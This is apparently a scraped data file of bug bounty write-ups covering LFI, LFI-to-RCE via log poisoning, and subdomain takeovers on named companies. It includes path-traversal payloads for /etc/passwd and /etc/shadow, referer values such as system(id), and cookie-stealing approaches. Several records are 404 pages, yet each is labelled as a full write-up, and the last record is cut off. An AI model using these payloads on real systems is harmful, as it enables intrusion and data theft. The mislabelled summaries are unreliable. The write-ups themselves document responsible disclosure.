files and directories, even more might by revealed 😉 Cross-Site Scripting on downloadsv9.xara.com OK – I promised not to write about a XSS in detail anymore, so I’ll leave you with the PoC screenshot: A real happy day for bug bounty hunters and Magix! X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://nirmaldahal.com.np/lfi-to-10-server-pwn/", "title": "404: This page could not be found.", "friendly_explanation": "This is a bug bounty writeup from https://nirmaldahal.com.np/lfi-to-10-server-pwn/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n404: This page could not be found. Nirmal Dahal 404 This page could not be found. LinkedIn X"}
{"source_url": "https://medium.com/@maxon3/lfi-to-command-execution-deutche-telekom-bug-bounty-6fe0de7df7a6", "title": "LFI to Command Execution: Deutche Telekom Bug Bounty | by Daniel Maksimovic | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@maxon3/lfi-to-command-execution-deutche-telekom-bug-bounty-6fe0de7df7a6. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLFI to Command Execution: Deutche Telekom Bug Bounty | by Daniel Maksimovic | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in LFI to Command Execution: Deutche Telekom Bug Bounty Daniel Maksimovic 3 min read · Nov 30, 2017 -- 11 Listen Share Few months ago I did a little subdomain bruteforce on telekom.de , to see if there are new subdomains which, if I’m luck enough, could have some high severity vulnerabilities, since Deutche telekom only accepts SQL injection and Remote Code Execution. After running aquatone, dnsenum, recon-ng and sublist3r, I collected all of the subdomains and removed duplicates, created a simple bash script to iterate over them and run dirb on every subdomain, and went on with my usual stalking of /r/netsec to read new interesting things. Few hours later, I checked to see how dirb was doing and something caught my eye. I saw one subdomain had info.php page available. I just love php, developers usually mess up something, and leave some doors for hackers to come in. Opening info.php gave me some info that will be useful when Code Execution part comes. After opening page I was greeted with login page. It was time to fire up BurpSuite and do some spidering. Few seconds later nice URL showed in burp : https://netweb.telekom.de/netweb/gui/help.php?HELPFILE=logon.hlp Oh, I just had to replace that logon.hlp with ../../../../../../../../etc/passwd : https://netweb.telekom.de/netweb/gui/help.php?SID&HELPFILE=../../../../../../../../etc/passwd And Bingo: Press enter or click to view image in full size /etc/passwd output. Some more files: Press enter or click to view image in full size /etc/release output. Press enter or click to view image in full size Part of report with LFI examples. So LFI is fun, but it is not in scope, time to execute some command. I choose error.log poisoning option. So remember that info.php ( phpinfo()) file in the site root. It showed the location of error.log file, and made my job a lot easier, all the locations from SecList LFI list, gave 0 hits on the error.log file location. And in info.php it was: https://netweb.telekom.de/netweb/gui/help.php?HELPFILE=../../../../../../../../../../../../../pkg/moip/netinfo/logs/apache-netweb-P/error.log Press enter or click to view image in full size error.log output So while running dirb on host I found file soap.php, that showed some errors that ended inside error.log , and one of the data inside log was referer value. Press enter or click to view image in full size soap.php error inside error.log Running simple test to see if referer value is executed: Press enter or click to view image in full size Running curl with referer value 0f 58–8 to see if value 50 is inside output. And again Bingo: 58–8 evaluated and 50 is output inside error.log. And for POC let’s run phpinfo() : Press enter or click to view image in full size setting referer to phpinfo() . And output: Press enter or click to view image in full size phpinfo() executed inside error.log file And the full report: Press enter or click to view image in full size Full report sent to Deutche Telekom Bug Bounty Reported: April 10 2017 Fixed: Sometime in August Daniel Maksimovic ( maxonebt4@gmail.com ) https://www.linkedin.com/in/daniel-maksimovic-73537882/ Security -- -- 11 Written by Daniel Maksimovic 294 followers · 14 following A pentester. A bug bounty hunter. All together that wierd security guy. Responses ( 11 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d", "title": "How we got LFI in apache Drill (Recon like a boss) | by Gujjuboy10x00 | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/how-we-got-lfi-in-apache-drill-recon-like-a-boss-6f739a79d87d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow we got LFI in apache Drill (Recon like a boss) | by Gujjuboy10x00 | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication How we got LFI in apache Drill (Recon like a boss) Gujjuboy10x00 3 min read · Apr 23, 2018 -- 4 Listen Share Hi Everyone, As promised in last blog, today I am gonna write this blog about few things on LFI. special thanks to one and only Jobert . Few months back i got private invite in hackerone platform. As you know Recon plays a major role while hacking on a program. Recon doesn’t always mean to find subdomains belonging to a company, it also could relate to finding out how a company is setting up its properties and what resources they are using. What is LFI? Local File inclusion (LFI), or simply File Inclusion, refers to an inclusion attack through which an attacker can trick the web application in including files on the web server by exploiting functionality that dynamically includes local files or scripts. The consequence of a successful LFI attack includes Directory Traversal and Information Disclosure as well as Remote Code Execution. Typically, Local File Inclusion (LFI) occurs, when an application gets the path to the file that has to be included as an input without treating it as untrusted input. This would allow a local file to be supplied to the include statement. After looking into shodan and crt.sh for that domain I found one , http://ec2-xx-xx-xxx-xxx.us-west-2.compute.amazonaws.com:8047 and Istarted digging there and no success for intial hours.Later i found tabs like Query , storage tab , so i quickly gone to their document to read all things and how it works at https://drill.apache.org/docs/ . Few things on query : The query specifies the data source location and includes data casting.Specifying the Data Source Location ¶The optional USE statement runs subsequent queries against a particular storage plugin . The USE statement typically saves typing some of the storage plugin information in the FROM statement. If you omit the USE statement, specify a storage plugin, such as dfs, and optionally a workspace, such as default, and a path to the data source using dot notation and back ticks. For example: d fs.`default`.`/Users/drill-user/apache-drill-1.1.0/log/sqlline_queries.json `; After understating few document , Itook help from the great hacker Jobert Abma (Co-founder of HackerOne), he told we can try to get LFI. Wait for a moment and listen music. after few minutes jobert come up with below json file , which he wrote as dfs storage method : { \"type\": \"file\", \"enabled\": true, \"connection\": \"file:///\", \"config\": null, \"workspaces\": { \"etc\": { \"location\": \"/etc\", \"writable\": false, \"defaultInputFormat\": \"tsv\" } }, \"formats\": { \"tsv\": { \"type\": \"text\", \"extensions\": [ \"tsv\"], \"delimiter\": \"\\t\" } } } and just call that from query tab like: select * from dfs.etc.`passwd` and wow! all we got is: Press enter or click to view image in full size So , It’s time to partyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy! We then tried for multiple json file as dfs storage method and we got success. woot woot! I always believed that sharing is caring, and I have been learning from multiple security researchers. Hope You liked this finding. Many more are coming. Stay tuned. DM is open for any questions on twitter ( Gujjuboy10x00 , hackerone.com/gujjuboy10x00). Security Hackerone Hacker Vulnerability Apache -- -- 4 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Gujjuboy10x00 651 followers · 54 following security analyst | Keep calm and hack the planet https://linkedin.com/in/vishalpanchani Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "http://hassankhanyusufzai.com/RFI_LFI_writeup/", "title": "Page not found", "friendly_explanation": "This is a bug bounty writeup from http://hassankhanyusufzai.com/RFI_LFI_writeup/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPage not found Page not found Looks like you’ve followed a broken link or entered a URL that doesn’t exist on this site. If this is your site, and you weren’t expecting a 404 for this path, please visit Netlify’s “page not found” support guide for troubleshooting tips."}
{"source_url": "https://medium.com/@logicbomb_1/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899", "title": "#BugBounty — “Journey from LFI to RCE!!!”-How I was able to get the same in one of the India’s popular property buy/sell company. | by Avinash Jain (@logicbomb) | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@logicbomb_1/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n#BugBounty — “Journey from LFI to RCE!!!”-How I was able to get the same in one of the India’s popular property buy/sell company. | by Avinash Jain (@logicbomb) | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication #BugBounty — “Journey from LFI to RCE!!!”-How I was able to get the same in one of the India’s popular property buy/sell company. Avinash Jain (@logicbomb) 3 min read · Apr 19, 2018 -- 13 Listen Share Hi Guys, This blog is about how I was able to get Remote Code Execution (RCE) from Local file inclusion (LFI) in one of the India’s property buyers & sellers company. Let’s see what was the complete scenario- As a bugbounty hunter the most important thing that I feel is the approach which we try or follow to exploit the vulnerability and which ultimately leads to have a much more impact from the vulnerability and the same I carried here. While searching for the vulnerabilities, I found LFI in the target site- https://www.victimsite.com/forum/attachment-serve?name=../../../../../../../../../../etc/shadow&path =. As you can see parameter “name” was vulnerable to LFI. Press enter or click to view image in full size LFI (/etc/shadow) I was confirmed that LFI was there and so now my target was to escalate it to get RCE. Before that, I have read many articles on how to get RCE from LFI and this one helped me a little here — https://medium.com/@p4c3n0g3/lfi-to-rce-via-access-log-injection-88684351e7c0 . Now the idea was to get access to some file may be log files which could provide some user controller input (in order to run some command) . So I tried reading access logs ,error logs , different location to access them. Press enter or click to view image in full size Access Logs response But it seems the user with which I got LFI didn’t have access to access logs files. Did a little reading,researching and I came to know that “/proc/self/fd” provides symbolic shortcut to access logs and various other system related file. So I tried reading those in search for access logs- Press enter or click to view image in full size /proc/self files and I run intruder over /proc/self/fd/{number} and one of the fd files provided me access to access logs — Press enter or click to view image in full size Access log file and what caught my attention here was “referer” header because I knew that it was something which is under user controlled input. Time to execute some command. I added ‘referer’ header in the HTTP request , set its value to system(id) and forwarded it- Press enter or click to view image in full size LFI to RCE and a cheerful response :) Press enter or click to view image in full size RCE Response So this is how I was able to get Remote code execution(RCE) from Local file inclusion(LFI)! :) Report details- 13-April-2018 — Bug reported to the concerned company. 16-April-2018 — Bug was marked fixed. 16-April-2018 — Re-tested and confirmed the fix Reward in progress. Thanks for reading! ~Logicbomb ( https://twitter.com/logicbomb_1 ) Bug Bounty Vulnerability Penetration Testing Ethical Hacking Hacking -- -- 13 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Avinash Jain (@logicbomb) 4.99K followers · 230 following Security Engineer @Microsoft | DevSecOps | Speaker | Breaking stuff to learn | Featured in Forbes, BBC| Acknowledged by Google, NASA, Yahoo, UN etc Responses ( 13 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://smaranchand.com.np/2019/12/subdomain-takeover-via-pantheon/", "title": "Subdomain takeover via pantheon – Smaran Chand", "friendly_explanation": "This is a bug bounty writeup from https://smaranchand.com.np/2019/12/subdomain-takeover-via-pantheon/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain takeover via pantheon – Smaran Chand Skip to content Smaran Chand Menu Home About Me Search for: December 26, 2019 Subdomain takeover via pantheon I hope you are having a great time, I would like to share an issue which i discovered in less than 10 minutes and got rewarded $XXXX bounty within 24 hours of the submission. So the story begins when I visited a scope, one of the subdomains and I received a certificate error. I removed SSL from the protocol and used HTTP only and the site opened without any certificate error. The Site was giving 404 errors in the index page with pantheon stating “Unknown Site”, I felt it might be vulnerable to subdomain takeover issue. Without wasting any time I signed up for pantheon, added payment details and created a sandbox domain, installed WordPress and added simple Title on the homepage as ” Subdomain Takeover”. The sandbox domain provided by pantheon looked like http://dev-subdomaintakeover[.]patheonsite.io/ And then I added the vulnerable domain to my pantheon account or routed the sandbox domain to vulnerable subdomain. and within few seconds the site was updated with my sandbox domain content. The same method was used to hack the website belonging to the current president of the United States Of America Donald J Trump. References: https://github.com/EdOverflow/can-i-take-over-xyz/issues/24 https://medium.com/@hussain_0x3c/hostile-subdomain-takeover-using-pantheon-ebf4ab813111 https://thehackernews.com/2017/02/donald-trump-website-hacked.html Bug Bounty Post navigation Older post An inconsistent CSRF Newer post The Tricky XSS 8 Comments Harsh says: February 24, 2020 at 9:49 pm hi , Please help .. while enumerating for subdomain of one public program lets say redacted.com, i found a dead subdomain and the similar web page of pantheon.io while visiting i signed up and went on creat a site box but when i enter the subdomain it is giving me error like this – The site name can only contain a-z, A-Z, 0-9, and dashes (‘-‘), cannot begin or end with a dash. P.S. i just create a normal account and not the agency one , i cant add custom domain, what should i do please reply Reply smaran.chand says: February 27, 2020 at 9:18 pm Replied you on twitter. 🙂 Reply Pingback: List of bug bounty writeups · Pentester Land – Blog du Chauve Pingback: These Bug Bounty Writeups will Change Your Life - PrimeHackers cyberdude says: October 21, 2021 at 8:07 pm Hi, I created a normal account on pantheon and now I am not able to add a custom domain. For this feature, the website is asking me to buy a plan. Is there anything I can do? Thank you. Reply smaran.chand says: October 21, 2021 at 8:15 pm Hi Cyberdude, You need a Pantheon subscription to add the domain to your site. -Thank you Reply Phantom says: January 3, 2022 at 4:12 pm Hi smaran. Needed your help. Just found the same subdomain takeover on one of the web. But i sent a theoritical report. They closed it as Not Applicable and asked me to provide a practical exploit. I did as you mentioned here but the major drawback for me is that i dont have a credit card. Can u please help me if u have any test account or can u exploit it for me? i know it sounds absurd but definietly i will pay you some part of the bounty. Hope to hear from you back. Reply smaran.chand says: January 4, 2022 at 8:08 am Hi Phantom, I would love to help you but I don’t have any active subscription of pantheon currently, let me see of there is anything i can do. Regards, Smaran Reply Leave a Comment Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website Save my name, email, and website in this browser for the next time I comment. Notify me of follow-up comments by email. Notify me of new posts by email. Δ Facebook | Twitter"}
{"source_url": "https://blog.takemyhand.xyz/2019/05/escalating-subdomain-takeovers-to-steal.html", "title": "Escalating subdomain takeovers to steal cookies by abusing document.domain", "friendly_explanation": "This is a bug bounty writeup from https://blog.takemyhand.xyz/2019/05/escalating-subdomain-takeovers-to-steal.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nEscalating subdomain takeovers to steal cookies by abusing document.domain takemyhand - security blog About Escalating subdomain takeovers to steal cookies by abusing document.domain May 24, 2019 • t4kemyh4nd H i everyone, It's been a really long time since I've blogged about anything. Mainly because I got a job as security analyst- therefore I've been very busy. And I also got into Synack! This blog post focuses on one of my recent findings, how I was able to escalate an out of scope subdomain takeover to steal the session cookies. And how I also thought of a few more methods to escalate it, affecting the main domain. Before I get started with the bug, I would like to talk a little about same-origin policy. If 2 websites want to communicate with each other, or perhaps if 2 hosts want to interact with each other, there could be mainly 2 ways to go around this. The book \"Tangled Web\" (a great book, do read it) states the following: \" Attempts to broaden origins or facilitate cross-domain interactions are more common. The two broadly sup- ported ways of achieving these goals are document.domain and postMessage(...)\" DOCUMENT.DOMAIN This JavaScript property permits any two cooperating websites that share a common top-level domain (such as example.com , or even just .com ) to agree that for the purpose of future same-origin checks, they want to be considered equivalent. So basically, if login.example.com and www.example.com both explicitly set their document.domain to example.com, this will lax the same-origin policy checks thereafter. Exploitation I was hunting on the Postmates bug bounty program from H1. Now this program has a limited scope. I came across an [[in-scope]] endpoint like the following: https://raster-static.postmates.com/?url= Now this endpoint was only was only accepting image links coming from subdomains of postmates.com. I thought, if somehow I can find a subdomain takeover, maybe I can find an SSRF or perhaps serve my own malicious content to the victim. So I went ahead and fired up some subdomain discovery tools and started sifting through them. I found one subdomain, impact.postmates.com , which was prone to a Github subdomain takeover. I went ahead and added the custom domain name to my test repo and the subdomain was mine. However, I couldn't have access to any backend, so an SSRF was impossible in this case. The max I could do was serve random JPEG's. Bummer. After a lot of time of thinking, something struck my mind. The main domain for users in Postmates is, postmates.com . Now, \"Tangled Web\" also states: \" Simply because l ogin.example.com has set its document.domain to example.com does not mean that it will be allowed to access content originating from the website hosted at http://example.com/ . That website needs to perform such an assignment, too, even if common sense would indicate that it is a no-op.\" So, if and only if, postmates.com has explicitly set it's document.domain, maybe I could set impact.postmates.com 's document.domain to postmates.com and access it's cookies somehow? Precursor: a.xyz.com can NOT set it's document.domain to a.a.xyz.com or b.xyz.com , but it CAN set it's document.domain to xyz.com . An example of changing the values of blog.takemyhand.xyz to other settings: That being said, I went ahead to check if postmates.com had explicitly set their document.domain. They had! Now, you have to keep in mind, that this attack worked only because the main domain of the program was postmates.com (that is, document.domain = postmates.com ) and not something like www.postmates.com ( document.domain possibly set to www.postmates.com , because then I could not set the document.domain of impact.postmates.com to www.postmates.com ). So now all I had to do was, using JS, set the document.domain to postmates.com , and add the following code in my javascript to steal the cookies from the main account: That's it, I could alert the cookies of postmates.com now, and possibly perform an account takeover, since I had complete access to the DOM of the main website. While working on this, I even thought of a few other creative ways to escalate an subdomain takeover to increase it's impact: Bypassing X-Frame-Options : SAMEORIGIN Bypassing CORS validation where the Access-Control-Allow-Origin is set to *.example.com (* being any subdomain) Bypassing URL validation wherever applicable (eg. open redirects to steal OAuth login tokens etc. Regards, t4kemyh4nd takemyhand - security blog takemyhand - security blog t4kemyh4nd 0xtakemyhand OSCE3 | AppSec engineer @ GitLab | Android, web, network, CTFs"}
{"source_url": "https://medium.com/@friendly_/subdomain-takeover-awarded-200-8296f4abe1b0", "title": "Subdomain takeover [Awarded $200] | by Friendly | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@friendly_/subdomain-takeover-awarded-200-8296f4abe1b0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain takeover [Awarded $200] | by Friendly | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Subdomain takeover [Awarded $200] Friendly 3 min read · May 7, 2019 -- 2 Listen Share The story is simple, the reward was “alright”. Let’s start. ^_^ Press enter or click to view image in full size I came across a website known as ownCloud. Their bug bounty program is located here — https://owncloud.com/owncloud-bug-bounty-program/ and their H1 program is located here https://hackerone.com/owncloud Their bounty program looked nice and juicy and I wanted some dough ( 🤑 ) So I ran https://github.com/aboul3la/Sublist3r [pretty sure everyone is aware of this] and I came cross a domain that was displayed as Press enter or click to view image in full size So I did a quick search on their CNAME and it points to owncloud.fider.io but somehow wasn’t reflecting back on their feedback.owncloud.com domain. CNAME check tool I used — https://toolbox.googleapps.com/apps/dig/ I then registered on https://getfider.com/ a demo account and saw that they had a custom page to set whichever domain you wanted. Press enter or click to view image in full size I then pointed the feedback.owncloud.com domain to my testing domain on https://getfider.com/ and saw that my inputs reflected over to http://feedback.owncloud.com/ Press enter or click to view image in full size I also noticed that they had an advanced page in the settings page which allows you to use CSS. I cooked up an IP grabber and a cookies grabber code via CSS to show the escalation of this. Press enter or click to view image in full size I swiftly reported it and in 2 hours, the issue was fixed via email. I was then told to send the report on HackerOne and I got my bounty. I thought I would have gotten $5k for their subdomain takeover, but turns out it was $200 since .ownCloud was out of scope. However , I’d deem this as a very high security risk and the payout should have been more, but what can you do — the company has “more rights” to your inputs than you yourself. Grateful- but not satisfy. Timeline: 4/20/2019 issue was reported. — 2 hours later the issue was fixed. Via email talks 3 weeks 5/6/2019. Paid out on 5/7/2019–$200. Worth it? Not sure. Thanks for reading. If you have questions regarding this, then feel free to shoot me a DM on Twitter https://twitter.com/Skeletorkeys or, join our Discord Server https://discord.gg/B6rZDTB to talk to any of the hundreds of people for help, or just looking to talk to other Hax0rs. Bug Bounty Subdomain Takeovers Bounty Program -- -- 2 Written by Friendly 403 followers · 4 following I am Friendly. Your friendly mid-night exploiter. Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/how-i-bought-my-way-to-subdomain-takeover-on-tokopedia-8c6697c85b4d", "title": "How i bought a subdomain of Tokopedia’s website (yeah you read it right) | by accalon | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/how-i-bought-my-way-to-subdomain-takeover-on-tokopedia-8c6697c85b4d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow i bought a subdomain of Tokopedia’s website (yeah you read it right) | by accalon | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication How i bought a subdomain of Tokopedia’s website (yeah you read it right) accalon 4 min read · Jan 20, 2020 -- 3 Listen Share Tl;dr : a subdomain of tokopedia’s website is pointed to an expired Top-Level-Domain available to buy, so obviously I go ahead and buy it. Blocked by login/pay wall? Read for free here : ( https://c2a.github.io/How-I-bought-a-subdomain-of-Tokopedia-website ). … Greetings. When digging some old emails, i found one of my findings on tokopedia.com, and I decided to make a write-up about it. Tokopedia is one of the few company from Indonesia, that host their own public Bug Bounty Program. You can read the rules and details here: https://github.com/tokopedia/Bug-Bounty . After reading their rules, I noticed that the targets is mainly set to wildcard domains (*.tokopedia.com and *.tokopedia.net). So i began to enumerate the subdomain using a couple of open source tools like sublist3r, knockpy, massdns, etc. I found some interesting subdomain where i found some interesting findings too ( The forgotten content : information disclosure and reflected XSS on Tokopedia ). But the one that catches my eyes is REDACTED.tokopedia.com, because when i access the subdomain, i was getting an ERR_NAME_NOT_RESOLVED error page from my browser. Using dig command in my terminal, turns out that the CNAME configuration is pointing to another Top Level Domain (REDACTED.com). So REDACTED.tokopedia.com is actually an alias for another different domain which is REDACTED.com. Surprisingly, when i checked the whois record, the domain is actually expired. So i head straight up to namecheap.com to check if it’s available to buy, and well, it is. Press enter or click to view image in full size Here comes the dilemma, I was really broke at that time (seriously), i can’t even afford a domain for $8 , PLUS , I’m still not sure whether this subdomain is actually takeover-able or not. I even consider to report this vulnerability without buying the domain, but i don’t think that’s a good proof of concept. So, decided to take the risk, borrowing $8 from my friend (kudos to Mr. N), then bought the domain. After pointing it to a free hosting service, i try to open the subdomain again, and well, i successfully taken over the subdomain because it’s now pointing to my own server. I decided to make some PoC for stored XSS, but stumble upon a problem because the cookies is set with secure flag, so the site needs to be hosted in https. After i set a free SSL certificate for REDACTED.com, another problem arise, the browser throws a privacy warning, because the site is accessed from REDACTED.tokopedia.com, while the certificate is signed for REDACTED.com. I got this from stackoverflow, the warning is different but you got the idea. They won’t allow me to make a *.tokopedia.com SSL certificate since it’s reserved by the company, so i decided to report it right away. We could still steal cookies if the user decided to click ‘ proceed to…’ button anyway, so yeah. Press enter or click to view image in full size NOTE: If you found a subdomain takeover, i think it’s not wise to show something unnecessary on the front page, the company won’t like it because users could saw it, and it’s bad for their reputations. This report is from my earlier days as a Bug Bounty Hunter, so showing “Subdomain taken over” on front page might not be the best idea. Instead, we could write our PoC on hidden html tag, and maybe showing “Under Maintenance” on the front page. And don’t forget to randomize the file name we hosted on that subdomain so it won’t be accidentally found by users. Well, the Security Team verified my report, and it’s a valid security bug with High Severity, and they decided to reward me. Spending 8 bucks for three digits bounty rewards? I see this as an absolute win. Press enter or click to view image in full size Thanks. Timeline: July 27 2019: Report sent. July 29 2019: Security team verified the report, valid with High Severity. July 31 2019: Bug fixed, they asked me to re-test the bug. November 20 2019: $$$ awarded. Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Writeup Bug Bounty Hacking -- -- 3 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by accalon 301 followers · 2 following nobody. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://offensi.com/2019/01/31/lfi-in-apigee-portals/", "title": "LFI in Apigee portals – Offensi", "friendly_explanation": "This is a bug bounty writeup from https://offensi.com/2019/01/31/lfi-in-apigee-portals/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLFI in Apigee portals – Offensi Contact LFI in Apigee portals 31 January 2019 / wtm@offensi.com / 0 Comments Introduction Apigee provides clients with an API management platform that enables them to design, secure, deploy, monitor, and scale API’s. Furthermore Apigee provides clients with a customizable developer portal to enable developers to consume API’s easily and securely, and to measure API performance and usage. Apigee was acquired by Google in 2016 and therefore it is considered in scope for the Google VRP , meaning that any valid vulnerability found in the Apigee platform will be rewarded. Creating a custom portal In order to interact with the development community, API providers can expose their API to the public by building a custom portal. Apigee portals are based on Drupal 7 and come with a preloaded set of options for users to customize. Users can modify the default theme, add pages and users, manage assets and publish API’s, as can be seen in the screenshot taken from the Portal management interface. When done editing, the portal manager publishes the portal on a subdomain of apigee.io. Healthapix.apigee.io shows a clear example of what the end result of a portal looks like. Customizing the stylesheet According to the documentation on https://docs-new.apigee.com , users can edit the style of the theme by using SCSS instead of CSS: The style rules are defined using Sassy Cascading Style Sheet (SCSS) . SCSS is a superset of Cascading Style Sheets (CSS), offering the following advantages: Global variables that can be re-used throughout the style sheet. Nested rules to save style sheet development time. Ability to create mixins and functions This implicates that on the server side compilation and conversion is taking place. After compilation completes regular CSS files are published to the portal. This process looks like something that might be worth taking a closer look at. The import directive When going through the language specific documentation on sass-lang.com, there is one directive that stands out from the rest: CSS has an import option that lets you split your CSS into smaller, more maintainable portions. The only drawback is that each time you use @import in CSS it creates another HTTP request. Sass builds on top of the current CSS @import but instead of requiring an HTTP request, Sass will take the file that you want to import and combine it with the file you’re importing into so you can serve a single CSS file to the web browser. In short, the import directive allows us to reference other SCSS files by using this syntax: @import ‘somefile’. When seeing this directive, the SASS compiler will automatically try to locate ‘somefile.scss’, ‘somefile.sass’, or ‘somefile’. Depending on the version of the compiler you are using you might see some small differences in behavior. Exploitation What happens if we reference an arbitrary file with @import ‘/etc/shadow’? This file does not contain valid SCSS code, so compilation will most likely fail. As can be seen in the image above compilation fails indeed, throwing an error which exposes the contents of /etc/shadow, which is only readable by user root. This particular bug was fixed within a matter of hours after submitting the details to Google. Thanks to Google for running the VRP the way they do! [twitter-follow screen_name=’wtm_offensi’] Categories: Geen categorie Tags: Apigee , bug bounty hunting , Google , Google VRP , LFI , Local File inclusion 4 Google Cloud Shell bugs explained » Leave a Reply Cancel reply Copyright © 2025 Offensi Copyright Offensi — Up ↑ Discover more from Offensi Subscribe now to keep reading and get access to the full archive. Type your email… Subscribe Continue reading Loading Comments... Write a Comment... Email (Required) Name (Required) Website"}
{"source_url": "https://medium.com/bugbountywriteup/subdomain-takeover-new-level-43f88b55e0b2", "title": "Subdomain Takeover — New Level. Recently, I began to receive a requests… | by Valeriy Shevchenko | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/subdomain-takeover-new-level-43f88b55e0b2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover — New Level. Recently, I began to receive a requests… | by Valeriy Shevchenko | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Subdomain Takeover — New Level Valeriy Shevchenko 5 min read · Dec 17, 2018 -- 2 Listen Share Press enter or click to view image in full size Recently, I began to receive a requests to make pentest work for some projects (aka private bug bounty). And in such projects I do my best with results for customer and get maximum pleasure from the process. But the result of the last project just shocked me. I was asked to make a pentest for one Hosting Provider. I will not disclose the name of that company. And in my story I will use the name \"Hoster\". With hosting service webpage everything was standard. Offers to buy VDS, Domains, SSL certificates. First of all, I was surprised at how the user’s personal account was implemented. Proof of ownership of the email address during registration was not required. Ie it was possible to register with the email address steve.jobs@apple.com . Or even better — support@hoster.com . But fortunately, by analogy with such story , the disclosure of sensitive information support services didn't happen. However, it did happen when I created a test request for support and immediately checked the availability of neighbouring ID's of other support requests. Surprisingly, they were available. And it was possible to observe who and what registered with that Hoster. And what kind of problems are facing users. In general it's a usual IDOR vulnerability, which no one surprise for now . It was fixed asap. There were also several places with Stored XSS. There was also a Blind XSS which returned the Service Administrator Cookie to me. Thanks to this XSS, I was able to find out where the administrator interface is located, well, and in general I revealed a lot of interesting information. How many active users. How many domains are in control. How many VDS deployed. Payment history. And some other things… Press enter or click to view image in full size There were various problems with CSRF tokens that allowed to do a lot of dangerous things on my account on behalf of the user. And if there were places where CSRF tokens was implemented. Nobody planned to check them on the backend. As a result of my findings, some of the functionality was completely disabled. So for example, 2FA authentication was decided to temporarily remove as not implemented well. In the course of my work, I paid attention not only to security problems, but also to implementation errors or problems in the operation of some functionality. As a QA engineer I couldn't passing by this. In total, my issue tracker reached the number — 22. So many problems I found. The results were more than convincing. And I already planned to finish this project. But for some reason I remembered again the problem of the lack of confirmation of the owner of the email address during registration. And here I began to invent situations in which this could create maximum problems for the hosting company and its owners. At some point, I began to think about the connections of the owners of this hosting service with other projects of the same company. After a couple of minutes, I registered an account with the email address of another project of that company (let it be support@example.com ). Then I managed to link the domain example.com to my created account suppot@example.com . But I still could not control the content of the linked domain. But could perfectly send e-mails on behalf of the example.com service. Nice thing for phishing attack. I don't know where the reply letters came. Because I answered one such test letter to myself. But I did not get the answer. Probably 